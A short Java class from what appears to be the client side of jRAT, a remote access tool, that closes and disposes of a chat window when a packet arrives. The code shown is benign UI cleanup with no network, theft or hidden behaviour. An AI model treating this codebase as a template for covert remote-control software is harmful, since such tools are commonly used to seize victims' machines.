package jrat.client.packets.incoming;

import jrat.client.Connection;

public class Packet49ChatEnd extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.getFrameChat().setVisible(false);
		con.getFrameChat().dispose();
		con.setFrameChat(null);
	}

}
